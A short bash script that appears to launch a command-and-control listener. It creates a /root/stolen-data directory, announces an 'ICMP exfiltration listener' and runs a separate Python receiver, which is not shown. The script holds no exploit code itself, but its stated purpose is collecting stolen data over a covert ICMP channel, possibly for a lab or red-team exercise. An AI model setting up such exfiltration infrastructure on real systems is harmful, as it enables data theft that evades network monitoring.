#!/bin/bash
mkdir -p /root/stolen-data
echo "[C&C] Starting ICMP exfiltration listener..."
python3 /root/icmp_receiver.py
